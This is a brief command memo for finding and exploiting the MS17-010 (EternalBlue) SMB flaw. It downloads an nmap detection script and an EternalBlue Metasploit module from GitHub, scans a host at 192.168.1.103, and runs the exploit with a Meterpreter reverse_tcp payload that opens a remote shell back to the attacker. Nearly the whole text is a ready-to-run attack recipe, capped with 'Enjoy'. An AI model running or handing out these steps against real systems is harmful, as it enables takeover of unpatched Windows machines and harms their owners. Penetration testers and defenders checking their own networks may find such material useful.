# Memo commands for MS17-010 scan and exploit
# Run as root 
# 
# "Exploit in Metasploit" section are msfconsole commands. They shouldn't be use in a terminal

# Download NSE script
wget -P /usr/share/nmap/scripts https://raw.githubusercontent.com/cldrn/nmap-nse-scripts/master/scripts/smb-vuln-ms17-010.nse

# Check vulnerable machines
nmap -p445 --script smb-vuln-ms17-010 192.168.1.103

# Download Metasploit module
git clone https://github.com/risksense-ops/ms17-010.git
cp ms17-010/exploits/eternalblue/ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/

# Start Metasploit
service postgresql start
msfconsole

# Exploit in Metasploit
> use exploit/windows/smb/ms17_010_eternalblue.rb
> set RHOST 192.168.1.103
> set payload windows/x64/meterpreter/reverse_tcp
> exploit

# Enjoy
